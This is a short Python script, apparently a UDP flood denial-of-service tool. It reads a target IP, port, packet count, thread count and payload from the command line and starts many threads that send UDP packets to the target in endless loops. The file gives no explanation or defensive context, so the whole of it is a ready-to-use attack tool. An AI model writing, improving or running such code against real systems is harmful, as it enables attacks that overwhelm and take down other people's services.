import random
import socket
import threading
import sys

ip = sys.argv[1]
port = int(sys.argv[2])
times = int(sys.argv[3])
threads = int(sys.argv[4])
payload = sys.argv[5]
def run():
  data = payload.encode("utf-8")
  while True:
    i = random.choice(("[*]","[!]","[#]"))
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
    except:
        print("[!] Error!!!")
for y in range(threads):
	th = threading.Thread(target = run)
	th.start()